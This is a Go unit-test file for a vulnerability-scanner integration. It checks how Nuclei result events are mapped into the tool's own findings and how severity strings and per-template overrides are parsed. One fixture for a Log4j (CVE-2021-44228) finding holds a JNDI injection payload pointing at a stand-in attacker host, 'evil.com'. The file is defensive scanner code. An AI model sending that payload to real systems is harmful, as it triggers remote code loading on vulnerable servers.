package knownissuescan

import (
	"strings"
	"testing"

	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/gologger/formatter"
	"github.com/projectdiscovery/gologger/levels"
	"github.com/projectdiscovery/gologger/writer"
	"github.com/projectdiscovery/nuclei/v3/pkg/model"
	"github.com/projectdiscovery/nuclei/v3/pkg/model/types/severity"
	"github.com/projectdiscovery/nuclei/v3/pkg/model/types/stringslice"
	nucleiOutput "github.com/projectdiscovery/nuclei/v3/pkg/output"

	vigsev "github.com/vigolium/vigolium/pkg/types/severity"
)

func TestConvertResult(t *testing.T) {
	nr := &nucleiOutput.ResultEvent{
		TemplateID: "cve-2021-44228",
		Info: model.Info{
			Name:           "Log4j RCE",
			Description:    "Apache Log4j2 Remote Code Execution",
			Tags:           stringslice.New([]string{"cve", "rce", "log4j"}),
			Reference:      stringslice.NewRawStringSlice([]string{"https://nvd.nist.gov/vuln/detail/CVE-2021-44228"}),
			SeverityHolder: severity.Holder{Severity: severity.Critical},
		},
		Type:             "http",
		Host:             "https://example.com",
		Matched:          "https://example.com/api",
		URL:              "https://example.com/api",
		IP:               "93.184.216.34",
		Request:          "GET /api HTTP/1.1\r\nHost: example.com\r\n\r\n",
		Response:         "HTTP/1.1 200 OK\r\n\r\nOK",
		ExtractedResults: []string{"${jndi:ldap://evil.com/x}"},
		MatcherStatus:    true,
	}

	result := convertResult(nr)

	if result.ModuleID != "cve-2021-44228" {
		t.Errorf("ModuleID = %q, want %q", result.ModuleID, "cve-2021-44228")
	}
	if result.Info.Name != "Log4j RCE" {
		t.Errorf("Info.Name = %q, want %q", result.Info.Name, "Log4j RCE")
	}
	if result.Info.Description != "Apache Log4j2 Remote Code Execution" {
		t.Errorf("Info.Description = %q, want %q", result.Info.Description, "Apache Log4j2 Remote Code Execution")
	}
	if result.Info.Severity != vigsev.Critical {
		t.Errorf("Info.Severity = %v, want %v", result.Info.Severity, vigsev.Critical)
	}
	if result.Type != "http" {
		t.Errorf("Type = %q, want %q", result.Type, "http")
	}
	if result.Host != "https://example.com" {
		t.Errorf("Host = %q, want %q", result.Host, "https://example.com")
	}
	if result.URL != "https://example.com/api" {
		t.Errorf("URL = %q, want %q", result.URL, "https://example.com/api")
	}
	if result.IP != "93.184.216.34" {
		t.Errorf("IP = %q, want %q", result.IP, "93.184.216.34")
	}
	if len(result.Info.Tags) != 3 {
		t.Errorf("len(Tags) = %d, want 3", len(result.Info.Tags))
	}
	if len(result.Info.Reference) != 1 {
		t.Errorf("len(Reference) = %d, want 1", len(result.Info.Reference))
	}
	if len(result.ExtractedResults) != 1 {
		t.Errorf("len(ExtractedResults) = %d, want 1", len(result.ExtractedResults))
	}
	if !result.MatcherStatus {
		t.Error("MatcherStatus should be true for matched results")
	}
}

func TestConvertResult_NonMatchedEvent(t *testing.T) {
	// Nuclei fires the callback for every template evaluation.
	// Events with MatcherStatus=false are non-matches and should be
	// filtered in the Run callback. convertResult faithfully maps the
	// field so callers can distinguish.
	nr := &nucleiOutput.ResultEvent{
		TemplateID: "honeypot-detect",
		Info: model.Info{
			Name:           "Honeypot Detection",
			SeverityHolder: severity.Holder{Severity: severity.Info},
		},
		Host:          "https://example.com",
		URL:           "https://example.com",
		MatcherStatus: false,
	}

	result := convertResult(nr)

	if result.MatcherStatus {
		t.Error("MatcherStatus should be false for non-matched events")
	}
	if result.ModuleID != "honeypot-detect" {
		t.Errorf("ModuleID = %q, want %q", result.ModuleID, "honeypot-detect")
	}
}

func TestConvertResult_URLFallback(t *testing.T) {
	nr := &nucleiOutput.ResultEvent{
		TemplateID: "tech-detect",
		Info: model.Info{
			Name:           "Technology Detect",
			SeverityHolder: severity.Holder{Severity: severity.Info},
		},
		Host: "https://example.com",
		// URL is empty — should fall back to Host
	}

	result := convertResult(nr)

	if result.URL != "https://example.com" {
		t.Errorf("URL = %q, want %q (fallback from Host)", result.URL, "https://example.com")
	}
	if result.Info.Severity != vigsev.Info {
		t.Errorf("Info.Severity = %v, want %v", result.Info.Severity, vigsev.Info)
	}
}

func TestConvertResult_NilReferences(t *testing.T) {
	nr := &nucleiOutput.ResultEvent{
		TemplateID: "test-template",
		Info: model.Info{
			Name:           "Test",
			SeverityHolder: severity.Holder{Severity: severity.Medium},
			// Tags and Reference are zero values
		},
		Host: "https://test.com",
		URL:  "https://test.com/path",
	}

	result := convertResult(nr)

	if result.Info.Reference != nil {
		t.Errorf("Reference should be nil for empty references")
	}
	if result.ModuleID != "test-template" {
		t.Errorf("ModuleID = %q, want %q", result.ModuleID, "test-template")
	}
}

func TestParseSeverity(t *testing.T) {
	tests := []struct {
		input string
		want  vigsev.Severity
	}{
		{"critical", vigsev.Critical},
		{"Critical", vigsev.Critical},
		{"CRITICAL", vigsev.Critical},
		{"high", vigsev.High},
		{"medium", vigsev.Medium},
		{"low", vigsev.Low},
		{"info", vigsev.Info},
		{"unknown", vigsev.Undefined},
		{"", vigsev.Undefined},
		{"  high  ", vigsev.High},
	}

	for _, tt := range tests {
		got := parseSeverity(tt.input)
		if got != tt.want {
			t.Errorf("parseSeverity(%q) = %v, want %v", tt.input, got, tt.want)
		}
	}
}

func TestNormalizeSeverityOverrides(t *testing.T) {
	// nil/empty in → nil out (no allocation, cheap "no overrides" path).
	if got := normalizeSeverityOverrides(nil); got != nil {
		t.Errorf("normalizeSeverityOverrides(nil) = %v, want nil", got)
	}
	if got := normalizeSeverityOverrides(map[string]string{}); got != nil {
		t.Errorf("normalizeSeverityOverrides(empty) = %v, want nil", got)
	}

	in := map[string]string{
		"config-json-exposure-fuzz": "medium",
		"  Some-Mixed-Case  ":       " HIGH ", // keys lowercased+trimmed, values parsed
		"bogus-template":            "not-a-severity",
	}
	got := normalizeSeverityOverrides(in)

	if got["config-json-exposure-fuzz"] != vigsev.Medium {
		t.Errorf("config-json-exposure-fuzz = %v, want Medium", got["config-json-exposure-fuzz"])
	}
	if got["some-mixed-case"] != vigsev.High {
		t.Errorf("some-mixed-case = %v, want High", got["some-mixed-case"])
	}
	if _, ok := got["bogus-template"]; ok {
		t.Error("entries with an unparseable severity should be dropped")
	}
}

func TestConvertResultSeverityOverrideApplies(t *testing.T) {
	// The override is applied after convertResult in the callback; this exercises
	// the same lookup+assignment the callback performs.
	nr := &nucleiOutput.ResultEvent{
		TemplateID:    "config-json-exposure-fuzz",
		Info:          model.Info{Name: "Exposed JSON Configuration Files", SeverityHolder: severity.Holder{Severity: severity.Critical}},
		Host:          "https://example.com",
		MatcherStatus: true,
	}
	result := convertResult(nr)
	if result.Info.Severity != vigsev.Critical {
		t.Fatalf("precondition: convertResult severity = %v, want Critical", result.Info.Severity)
	}

	overrides := normalizeSeverityOverrides(map[string]string{"config-json-exposure-fuzz": "medium"})
	if override, ok := overrides[strings.ToLower(result.ModuleID)]; ok {
		result.Info.Severity = override
	}
	if result.Info.Severity != vigsev.Medium {
		t.Errorf("after override severity = %v, want Medium", result.Info.Severity)
	}
}

func TestBuildEngineOptions(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping engine options test in short mode")
	}

	cfg := Config{
		Tags:        []string{"cve"},
		ExcludeTags: []string{"dos"},
		Severities:  []string{"critical", "high"},
		Concurrency: 10,
		RateLimit:   200,
		ProxyURL:    "http://127.0.0.1:8080",
		Headers:     []string{"X-Custom: test"},
	}

	logger := &gologger.Logger{}
	logger.SetFormatter(formatter.NewCLI(false))
	logger.SetWriter(writer.NewCLI())
	logger.SetMaxLevel(levels.LevelSilent)

	opts := buildEngineOptions(t.Context(), cfg, logger)

	// Verify we get a reasonable number of options
	// (filters + rate limit + concurrency + proxy + headers + verbosity + disable update + logger)
	if len(opts) < 5 {
		t.Errorf("expected at least 5 options, got %d", len(opts))
	}
}
